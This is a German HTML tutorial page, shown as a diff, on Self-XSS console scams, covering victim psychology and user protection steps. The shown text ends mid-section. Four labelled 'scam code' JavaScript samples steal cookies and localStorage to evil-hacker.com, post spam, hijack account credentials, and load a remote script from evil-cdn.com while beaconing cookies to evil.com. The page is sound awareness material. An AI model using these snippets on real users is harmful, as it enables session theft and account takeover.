@@ -1,0 +1,1208 @@
+<!DOCTYPE html><html lang="de"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Console Security &amp; Self-XSS: Wie Console-Scams funktionieren, warum sie gefährlich sind und wie du dich und deine Website schützt. Praktische Tipps für User und Developer.">
+    <meta name="keywords" content="HTML, CSS, JavaScript, PHP, Bootstrap, Webentwicklung, DevPanicZone, Tutorials">
+    <meta name="author" content="DevPanicZone">
+    <title>Console Security &amp; Self-XSS – Schütze dich vor Scam-Angriffen | DevPanicZone</title>
+    <link rel="icon" type="image/svg+xml" href="/assets/icons/favicon.svg">
+    <link rel="icon" type="image/png" href="/assets/icons/favicon.png">
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <link rel="stylesheet" href="/assets/css/sidebar.css">
+    <link rel="stylesheet" href="/assets/vendor/prism/prism.css">
+</head>
+
+<body>
+    <!-- Header-Start -->
+<header class="site-header">
+    <div class="container">
+        <div class="header-content">
+            <div class="brand">
+                <a href="/" class="brand-link">
+                    <img src="/assets/icons/logo.svg" alt="DevPanicZone Logo" class="logo-icon">
+                    <span class="brand-name">DevPanicZone! Cheatsheets.</span>
+                </a>
+            </div>
+
+            <button class="theme-toggle" id="themeToggle" aria-label="Dark Mode umschalten">
+                <span class="theme-icon">
+                    <img src="/assets/icons/dark-mode.svg" alt="" width="20" height="20">
+                </span>
+            </button>
+
+            <button class="mobile-menu-toggle" id="mobileMenuToggle" aria-label="Menü öffnen">
+                <span class="hamburger"></span>
+            </button>
+
+            <nav class="main-nav" id="mainNav">
+                <ul class="nav-list">
+                    <li><a href="/" class="nav-link">Home</a></li>
+                    <li class="nav-item-dropdown">
+                        <button class="nav-link dropdown-toggle" aria-expanded="false">
+                            Tutorials
+                            <span class="dropdown-icon">▾</span>
+                        </button>
+                        <ul class="dropdown-menu">
+                            <!-- Main-Nav-Start -->
+                                <li><a href="/tutorials/html/">HTML</a></li>
+                                <li><a href="/tutorials/css/">CSS</a></li>
+                                <li><a href="/tutorials/bootstrap/">Bootstrap</a></li>
+                                <li><a href="/tutorials/javascript/">JavaScript</a></li>
+                                <li><a href="/tutorials/php/">PHP</a></li>
+                                <li><a href="/tutorials/misc/">Verschiedenes</a></li>
+                                <li><a href="/tutorials/documentation/">DevPanicZone!</a></li>
+                                <!-- Main-Nav-End -->
+                        </ul>
+                    </li>
+                    <li><a href="/glossary.html" class="nav-link">Glossar</a></li>
+                    
+                    <!-- Search Toggle -->
+                    <li>
+                        <button class="nav-link search-toggle" id="searchToggle" aria-label="Suche öffnen">
+                            <svg class="search-icon-nav" viewBox="0 0 23.25 28.09" aria-hidden="true">
+                                <path d="M23.25,11.62c0,2.56-.83,4.93-2.24,6.86l7.07,7.08c.7.7.7,1.83,0,2.53-.7.7-1.83.7-2.53,0l-7.07-7.08c-1.92,1.41-4.29,2.24-6.86,2.24C5.2,23.25,0,18.04,0,11.62S5.2,0,11.62,0s11.62,5.2,11.62,11.62ZM11.62,19.67c4.44,0,8.05-3.6,8.05-8.05S16.07,3.58,11.62,3.58,3.58,7.18,3.58,11.62s3.6,8.05,8.05,8.05Z"/>
+                            </svg>
+                        </button>
+                    </li>
+                </ul>
+                
+                <!-- Search Dropdown -->
+                <div class="search-dropdown" id="searchDropdown" hidden>
+                    <div class="search-input-group">
+                        <svg class="search-icon" viewBox="0 0 23.25 28.09" aria-hidden="true">
+                            <path d="M23.25,11.62c0,2.56-.83,4.93-2.24,6.86l7.07,7.08c.7.7.7,1.83,0,2.53-.7.7-1.83.7-2.53,0l-7.07-7.08c-1.92,1.41-4.29,2.24-6.86,2.24C5.2,23.25,0,18.04,0,11.62S5.2,0,11.62,0s11.62,5.2,11.62,11.62ZM11.62,19.67c4.44,0,8.05-3.6,8.05-8.05S16.07,3.58,11.62,3.58,3.58,7.18,3.58,11.62s3.6,8.05,8.05,8.05Z"/>
+                        </svg>
+                        <input 
+                            type="search" 
+                            id="globalSearch" 
+                            class="search-input" 
+                            placeholder="Tutorials durchsuchen..."
+                            aria-label="Suche">
+                        <kbd class="search-shortcut" aria-hidden="true">/</kbd>
+                    </div>
+                    
+                    <div class="search-results" id="searchResults" hidden>
+                        <div class="search-results-list" id="searchResultsList"></div>
+                        <div class="search-results-footer">
+                            <button class="search-view-all" id="searchViewAll">
+                                Alle Ergebnisse anzeigen →
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </nav>
+        </div>
+    </div>
+</header>
+<!-- Header-End -->
+
+    <main class="site-main">
+
+        <!-- Hero -->
+        <section class="hero tutorial-hero">
+            <div class="container">
+                <nav class="breadcrumbs"><a href="/" class="breadcrumb-link">Home</a><span class="breadcrumb-separator">›</span><a href="/tutorials/misc/" class="breadcrumb-link">Verschiedenes</a><span class="breadcrumb-separator">›</span><span class="breadcrumb-current">Console Security & Self-XSS</span></nav>
+                <h1 class="hero-title">Console Security &amp; Self-XSS</h1>
+                <p class="hero-subtitle">Wie Console-Scams funktionieren und wie du dich und deine Website schützt.</p>
+            </div>
+        </section>
+
+        <!-- Floating Button Links (Sidebar) -->
+        <button class="sidebar-toggle" id="sidebarToggle" aria-label="Inhaltsverzeichnis öffnen" title="Auf dieser Seite">
+            <span class="toggle-icon">☰</span>
+        </button>
+
+        <!-- Floating Button Rechts (Tutorial Navigation) -->
+        <button class="tutorial-nav-toggle" id="tutorialNavToggle" aria-label="Tutorial Navigation öffnen">
+            <span class="toggle-icon">
+                <img src="/assets/icons/library.svg" alt="" class="library-icon">
+            </span>
+        </button>
+
+        <!-- Sidebar Overlay für Mobile -->
+        <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+        <!-- Tutorial Layout -->
+        <div class="tutorial-layout">
+
+            <!-- Linke Sidebar (Floating Panel) -->
+            <aside class="tutorial-sidebar" id="tutorialSidebar">
+                <div class="sidebar-header">
+                    <h3 class="sidebar-title no-toc">Auf dieser Seite</h3>
+                    <button class="sidebar-close" id="sidebarClose" aria-label="Schließen">
+                        <span>×</span>
+                    </button>
+                </div>
+
+                <nav class="sidebar-toc" aria-label="Inhaltsverzeichnis">
+                    <ul class="toc-list">
+                        <!-- Sidebar-Anchor-Start -->
+                    <li class="toc-level-1"><a href="#was-ist-self-xss">Was ist Self-XSS?</a></li>
+                    <li class="toc-level-2"><a href="#warum-heisst-es-self-xss">Warum heißt es &quot;Self&quot;-XSS?</a></li>
+                    <li class="toc-level-1"><a href="#wie-funktioniert-der-angriff">Wie funktioniert der Angriff?</a></li>
+                    <li class="toc-level-2"><a href="#typische-scam-szenarien">Typische Scam-Szenarien</a></li>
+                    <li class="toc-level-1"><a href="#warum-zum-teufel-faellt-man-darauf-rein">Warum zum Teufel fällt man darauf rein?</a></li>
+                    <li class="toc-level-2"><a href="#psychologische-tricks">Psychologische Tricks</a></li>
+                    <li class="toc-level-2"><a href="#warnsignale-erkennen">Warnsignale erkennen</a></li>
+                    <li class="toc-level-1"><a href="#wie-schuetze-ich-mich-user-perspektive">Wie schütze ich mich? (User-Perspektive)</a></li>
+                    <li class="toc-level-2"><a href="#was-tun-wenn-es-passiert-ist">Was tun wenn es passiert ist?</a></li>
+                    <li class="toc-level-1"><a href="#wie-schuetze-ich-meine-website-developer-perspektive">Wie schütze ich meine Website? (Developer-Perspektive)</a></li>
+                    <li class="toc-level-2"><a href="#console-warnung-implementieren">Console-Warnung implementieren</a></li>
+                    <li class="toc-level-2"><a href="#implementierungs-optionen">Implementierungs-Optionen</a></li>
+                    <li class="toc-level-2"><a href="#zusaetzliche-schutzmassnahmen">Zusätzliche Schutzmaßnahmen</a></li>
+                    <li class="toc-level-1"><a href="#xss-allgemein-verstehen">XSS allgemein verstehen</a></li>
+                    <li class="toc-level-2"><a href="#typen-von-xss">Typen von XSS</a></li>
+                    <li class="toc-level-2"><a href="#xss-verhindern-entwickler-checkliste">XSS verhindern – Entwickler-Checkliste</a></li>
+                    <li class="toc-level-1"><a href="#best-practices-zusammenfassung">Best Practices – Zusammenfassung</a></li>
+                    <li class="toc-level-1"><a href="#weitere-ressourcen-links">Weitere Ressourcen &amp; Links</a></li>
+                    <li class="toc-level-1"><a href="#zusammenfassung">Zusammenfassung</a></li>
+                    <!-- Sidebar-Anchor-End -->
+                    </ul>
+                </nav>
+            </aside>
+
+            <!-- Rechte Sidebar (Floating Panel) -->
+            <aside class="tutorial-related">
+                <div class="sidebar-header">
+                    <h3 class="sidebar-title no-toc">Tutorials</h3>
+                    <button class="sidebar-close" id="tutorialNavClose" aria-label="Schließen">
+                        <span>×</span>
+                    </button>
+                </div>
+
+                <div class="sidebar-nav">
+                    <ul class="sidebar-nav-list">
+                    <li><a href="/tutorials/misc/web/console-security.html" class="active">Console Security & Self-XSS</a></li>
+                </ul>
+                </div>
+            </aside>
+
+            <!-- Wrapper .container -->
+            <div class="container">
+
+                <!-- Intro -->
+                <section class="categories section-top">
+                    <h2 id="was-ist-self-xss">Was ist Self-XSS?</h2>
+                    <p><strong>Self-XSS</strong> (Self Cross-Site Scripting) ist ein Social Engineering Angriff, bei dem
+                        Betrüger dich dazu bringen, bösartigen JavaScript-Code in deine eigene Browser-Console zu
+                        kopieren und auszuführen.</p>
+                    <p>Der Trick: Du führst den Schadcode selbst aus – die Angreifer müssen nicht mal deine Website
+                        hacken. Sie manipulieren einfach DICH!</p>
+
+                    <div class="info-box danger">
+                        <strong class="box-title danger no-toc" id="gefahr">Die Gefahr in Kürze
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Wenn du fremden Code in die Browser-Console kopierst, kann dieser:</p>
+                        <ul class="arrow-list">
+                            <li>Deine Login-Daten stehlen (Cookies, Session-Tokens)</li>
+                            <li>In deinem Namen Aktionen ausführen (Posts, Nachrichten, Käufe)</li>
+                            <li>Deine persönlichen Daten auslesen (E-Mail, Kontakte, Nachrichten)</li>
+                            <li>Dein Konto übernehmen oder kompromittieren</li>
+                            <li>Malware installieren oder Phishing betreiben</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="warum-heisst-es-self-xss">Warum heißt es "Self"-XSS?</h3>
+                    <p>Bei normalem XSS schmuggeln Angreifer Code in eine Website. Bei <strong>Self-XSS bist DU
+                            derjenige</strong>, der den Code ausführt – in deinem eigenen Browser, in deiner eigenen
+                        Session. Egal, auf welcher Seite.</p>
+
+                    <h4>Unterschied zu klassischem XSS</h4>
+
+                    <table class="ref-table">
+                        <thead>
+                            <tr>
+                                <th>Klassisches XSS</th>
+                                <th>Self-XSS</th>
+                            </tr>
+                        </thead>
+                        <tbody><tr>
+                            <td>Angreifer injiziert Code in Website</td>
+                            <td>Opfer führt Code selbst aus</td>
+                        </tr>
+                        <tr>
+                            <td>Technische Schwachstelle</td>
+                            <td>Social Engineering </td>
+                        </tr>
+                        <tr>
+                            <td>Betrifft viele User automatisch</td>
+                            <td>Betrifft nur die, die reinfallen</td>
+                        </tr>
+                        <tr>
+                            <td>Muss gepatcht werden</td>
+                            <td>Muss durch Aufklärung verhindert werden</td>
+                        </tr>
+                    </tbody></table>
+                </section>
+
+                <!-- Wie funktioniert der Angriff -->
+                <section class="categories">
+                    <h2 id="wie-funktioniert-der-angriff">Wie funktioniert der Angriff?</h2>
+
+                    <p>Die Angreifer nutzen verschiedene Maschen, um Leute dazu zu bringen, Code in die Console zu
+                        kopieren. Hier sind die häufigsten Szenarien:</p>
+
+                    <h3 id="typische-scam-szenarien">Typische Scam-Szenarien</h3>
+
+                    <details>
+                        <summary><strong>Szenario 1: "Gratis Features freischalten"</strong></summary>
+                        <div class="details-content">
+                            <p><strong>Versprechen:</strong> "Bekomme Facebook/Instagram Premium Features gratis!"</p>
+                            <p><strong>Anleitung:</strong> "Drücke F12, gehe zur Console, kopiere diesen Code..."</p>
+
+                            <div class="code-block">
+                                <div class="code-title">Der Scam-Code (NIEMALS AUSFÜHREN!)</div>
+                                <pre><code class="language-javascript">// Angeblich: "Aktiviert Premium Features"
+// Tatsächlich: Stiehlt deine Session
+
+// Liest alle Cookies aus
+const cookies = document.cookie;
+
+// Liest LocalStorage aus (könnte Tokens enthalten)
+const storage = JSON.stringify(localStorage);
+
+// Schickt alles an Angreifer
+fetch('https://evil-hacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({
+        cookies: cookies,
+        storage: storage,
+        url: window.location.href,
+        userAgent: navigator.userAgent
+    })
+});
+
+// Zeigt Fake-Bestätigung
+alert('Premium Features aktiviert! ✓');</code></pre>
+                            </div>
+
+                            <p><strong>Was passiert wirklich:</strong></p>
+                            <ul class="arrow-list">
+                                <li>Alle deine Cookies werden ausgelesen (inkl. Session-Cookie)</li>
+                                <li>LocalStorage-Daten werden gestohlen</li>
+                                <li>Alles wird an Server der Angreifer geschickt</li>
+                                <li>Angreifer können sich jetzt als DU einloggen</li>
+                                <li>Die Fake-Bestätigung täuscht Erfolg vor</li>
+                            </ul>
+                        </div>
+                    </details>
+
+                    <details>
+                        <summary><strong>Szenario 2: "Followers/Likes multiplizieren"</strong></summary>
+                        <div class="details-content">
+                            <p><strong>Versprechen:</strong> "Bekomme 10.000 Follower in 5 Minuten!"</p>
+
+                            <div class="code-block">
+                                <div class="code-title">Der Scam-Code (NIEMALS AUSFÜHREN!)</div>
+                                <pre><code class="language-javascript">// Angeblich: "Follower-Bot"
+// Tatsächlich: Postet Spam in deinem Namen
+
+// Holt CSRF-Token (wenn vorhanden)
+const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
+
+// Postet Spam-Nachricht
+fetch('/api/post', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'X-CSRF-Token': csrfToken
+    },
+    body: JSON.stringify({
+        message: '🚨 GRATIS iPhone 15! Klick hier: https://scam-site.com 🚨',
+        visibility: 'public'
+    })
+});
+
+// Sendet Nachrichten an alle Freunde
+// ... mehr bösartiger Code ...</code></pre>
+                            </div>
+
+                            <p><strong>Was passiert wirklich:</strong></p>
+                            <ul class="arrow-list">
+                                <li>Postet Spam/Phishing-Links in deinem Namen</li>
+                                <li>Sendet Spam-Nachrichten an alle deine Kontakte</li>
+                                <li>Folgt massenhaft Scam-Accounts</li>
+                                <li>Dein Account wird zum Bot-Account</li>
+                                <li>Kann zur Sperrung deines Accounts führen</li>
+                            </ul>
+                        </div>
+                    </details>
+
+                    <details>
+                        <summary><strong>Szenario 3: "Account-Bug fixen"</strong></summary>
+                        <div class="details-content">
+                            <p><strong>Versprechen:</strong> "Dein Account hat einen Bug! Fixe ihn mit diesem Code."</p>
+                            <p>Diese Masche nutzt Angst statt Gier – besonders effektiv!</p>
+
+                            <div class="code-block">
+                                <div class="code-title">Der Scam-Code (NIEMALS AUSFÜHREN!)</div>
+                                <pre><code class="language-javascript">// Angeblich: "Fixt Security-Bug"
+// Tatsächlich: Ändert dein Passwort/E-Mail
+
+fetch('/api/account/update', {
+    method: 'POST',
+    body: JSON.stringify({
+        email: 'hacker@evil.com',
+        password: 'HackerPassword123',
+        notifications: false  // Damit du keine Warnung bekommst
+    })
+});
+
+alert('✓ Sicherheitslücke geschlossen!');</code></pre>
+                            </div>
+
+                            <p><strong>Was passiert wirklich:</strong></p>
+                            <ul class="arrow-list">
+                                <li>Deine E-Mail-Adresse wird geändert</li>
+                                <li>Dein Passwort wird geändert</li>
+                                <li>Benachrichtigungen werden deaktiviert</li>
+                                <li>Du wirst ausgeloggt und kannst dich nicht mehr einloggen</li>
+                                <li>Komplette Account-Übernahme</li>
+                            </ul>
+                        </div>
+                    </details>
+
+                    <details>
+                        <summary><strong>Szenario 4: "Geheime Developer-Tools"</strong></summary>
+                        <div class="details-content">
+                            <p><strong>Versprechen:</strong> "Aktiviere versteckte Funktionen, die nur Entwickler
+                                kennen!"</p>
+                            <p>Zielt auf technikaffine User ab, die denken, sie wissen was sie tun.</p>
+
+                            <div class="code-block">
+                                <div class="code-title">Der Scam-Code (NIEMALS AUSFÜHREN!)</div>
+                                <pre><code class="language-javascript">// Angeblich: "Developer Mode"
+// Tatsächlich: Installiert persistenten Schadcode
+
+// Erstellt verstecktes Script-Element
+const script = document.createElement('script');
+script.src = 'https://evil-cdn.com/malware.js';
+document.head.appendChild(script);
+
+// Speichert Schadcode in LocalStorage
+localStorage.setItem('devMode', btoa('malicious code here'));
+
+// Lädt bei jedem Seitenaufruf nach
+setInterval(() =&gt; {
+    fetch('https://evil.com/track?user=' + document.cookie);
+}, 5000);
+
+console.log('✓ Developer Mode aktiviert!');</code></pre>
+                            </div>
+
+                            <p><strong>Was passiert wirklich:</strong></p>
+                            <ul class="arrow-list">
+                                <li>Lädt zusätzlichen Schadcode nach</li>
+                                <li>Persistiert in LocalStorage (bleibt auch nach Reload)</li>
+                                <li>Trackt kontinuierlich deine Aktivitäten</li>
+                                <li>Kann Keylogger installieren</li>
+                                <li>Schwer zu entfernen (da persistent)</li>
+                            </ul>
+                        </div>
+                    </details>
+                </section>
+
+                <!-- Warum fällt man darauf rein -->
+                <section class="categories">
+                    <h2 id="warum-zum-teufel-faellt-man-darauf-rein">Warum zum Teufel fällt man darauf rein?</h2>
+
+                    <p>Self-XSS ist so effektiv, weil es psychologische Tricks nutzt. Die Angreifer wissen genau, wie
+                        sie Menschen manipulieren.</p>
+
+                    <h3 id="psychologische-tricks">Psychologische Tricks</h3>
+
+                    <div class="grid-2col">
+                        <div class="info-box">
+                            <strong class="box-title no-toc">1. Versprechen von Belohnungen
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                    <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,0,
+    1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+    25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z">
+                                    </path>
+                                </svg>
+                            </strong>
+                            <ul class="arrow-list">
+                                <li>"Gratis Premium", "10.000 Follower", "Unbegrenzte Coins"</li>
+                                <li>Menschen wollen gerne etwas umsonst</li>
+                                <li>FOMO (Fear Of Missing Out) – "andere haben es schon!"</li>
+                            </ul>
+                        </div>
+
+                        <div class="info-box">
+                            <strong class="box-title no-toc">2. Autoritätsprinzip
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                    <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,0,
+    1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+    25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z">
+                                    </path>
+                                </svg>
+                            </strong>
+                            <ul class="arrow-list">
+                                <li>"Offizielle Anleitung", "Von Facebook empfohlen"</li>
+                                <li>Fake-Screenshots von "offiziellen" Quellen</li>
+                                <li>Technische Begriffe erwecken Vertrauen</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="grid-2col">
+                        <div class="info-box">
+                            <strong class="box-title no-toc">3. Social Proof
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                    <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,0,
+    1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+    25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z">
+                                    </path>
+                                </svg>
+                            </strong>
+                            <ul class="arrow-list">
+                                <li>"Über 1 Million User nutzen das schon!"</li>
+                                <li>Fake-Testimonials und gefälschte Kommentare</li>
+                                <li>"Deine Freunde machen es auch" (oft gelogen)</li>
+                            </ul>
+                        </div>
+
+                        <div class="info-box">
+                            <strong class="box-title no-toc">4. Dringlichkeit &amp; Angst
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                    <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,0,
+    1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+    25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z">
+                                    </path>
+                                </svg>
+                            </strong>
+                            <ul class="arrow-list">
+                                <li>"Nur noch heute verfügbar!"</li>
+                                <li>"Dein Account wird gelöscht wenn du nicht..."</li>
+                                <li>"Security-Bug – handle JETZT!"</li>
+                                <li>Zeitdruck verhindert rationales Denken</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">5. Technische Unkenntnis
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,0,
+    1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+    25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z">
+                                </path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li>Viele User wissen nicht, was die Console ist</li>
+                            <li>"Klingt kompliziert = muss echt sein"</li>
+                            <li>Vertrauen auf "Experten" die das empfehlen</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="warnsignale-erkennen">Warnsignale erkennen</h3>
+
+                    <div class="info-box danger">
+                        <strong class="box-title danger no-toc" id="achtung">🚩 Red Flags – Diese Dinge sind IMMER
+                            verdächtig:
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><strong>Jemand bittet dich, Code in die Console zu kopieren</strong> – Niemals legitim!
+                            </li>
+                            <li><strong>Zu gut um wahr zu sein</strong> – Gratis Premium, unbegrenzte Features, etc.
+                            </li>
+                            <li><strong>Zeitdruck</strong> – "Nur heute!", "Bevor es zu spät ist!"</li>
+                            <li><strong>Rechtschreibfehler</strong> – Echte Unternehmen haben Lektoren</li>
+                            <li><strong>Verdächtige URLs</strong> – faceb00k.com statt facebook.com</li>
+                            <li><strong>Unprofessionelles Design</strong> – Sieht billig gemacht aus</li>
+                            <li><strong>Keine offizielle Quelle</strong> – YouTube-Video statt offizieller Website</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <!-- Weitere Sections nach Bedarf -->
+                <section class="categories">
+                    <h2 id="wie-schuetze-ich-mich-user-perspektive">Wie schütze ich mich? (User-Perspektive)</h2>
+                    <p>Als normaler User kannst du dich mit einfachen Regeln schützen:</p>
+
+                    <div class="info-box notice">
+                        <strong class="box-title notice no-toc">Goldene Regeln
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,
+                0,15.25,0ZM24.85,10.96l-10.96,10.96c-.33.33-.76.49-1.19.49s-.86-.16-1.19-.49l-5.13-5.13c-.66-.66-.66-1.73,
+                0-2.39.66-.66,1.73-.66,2.39,0l3.94,3.94,9.76-9.76c.66-.66,1.73-.66,2.39,0,.66.66.66,1.73,0,2.39Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><strong>NIEMALS fremden Code in die Console kopieren</strong> – Egal was versprochen
+                                wird!</li>
+                            <li><strong>Keine "Hacks" oder "Tricks"</strong> – Wenn es zu gut klingt, ist es das auch
+                            </li>
+                            <li><strong>Offizielle Kanäle nutzen</strong> – Nur Infos von offiziellen Websites vertrauen
+                            </li>
+                            <li><strong>Im Zweifel NICHT machen</strong> – Lieber eine Chance verpassen als gehackt
+                                werden</li>
+                            <li><strong>Freunde warnen</strong> – Wenn du so eine Nachricht bekommst, warne andere</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="was-tun-wenn-es-passiert-ist">Was tun wenn es passiert ist?</h3>
+
+                    <div class="info-box danger">
+                        <strong class="box-title danger no-toc" id="achtung">Sofortmaßnahmen bei Verdacht:
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <ol>
+                            <li><strong>Passwort sofort ändern</strong> – Von einem anderen Gerät aus!</li>
+                            <li><strong>Alle aktiven Sessions beenden</strong> – "Überall abmelden" in Einstellungen
+                            </li>
+                            <li><strong>Two-Factor Authentication aktivieren</strong> (2FA/MFA)</li>
+                            <li><strong>E-Mail-Adresse prüfen</strong> – Wurde sie geändert?</li>
+                            <li><strong>Benachrichtigungen prüfen</strong> – Verdächtige Aktivitäten?</li>
+                            <li><strong>Browser-Daten löschen</strong> – Cookies, LocalStorage, Cache</li>
+                            <li><strong>Malware-Scan durchführen</strong> – Könnte mehr installiert worden sein</li>
+                            <li><strong>Support kontaktieren</strong> – Melde den Vorfall der Platform</li>
+                        </ol>
+                    </div>
+
+                    <!-- Browser-Daten löschen -->
+                    <div class="code-block">
+                        <div class="code-header">
+                            <div class="box-title"><strong>Browser-Daten löschen (Chrome/Firefox)</strong></div>
+                        </div>
+                        <div class="grid-2col">
+                            <div>
+                                <pre><code class="language-text">Chrome:
+1. Einstellungen → Datenschutz und Sicherheit
+2. Browserdaten löschen
+3. Zeitraum: "Gesamte Zeit" auswählen
+4. Aktivieren: Cookies, Cache, Websitedaten
+5. "Daten löschen" klicken</code></pre>
+                            </div>
+                            <div>
+                                <pre><code class="language-text">Firefox:
+1. Einstellungen → Datenschutz &amp; Sicherheit
+2. Cookies und Website-Daten
+3. "Daten entfernen..." klicken
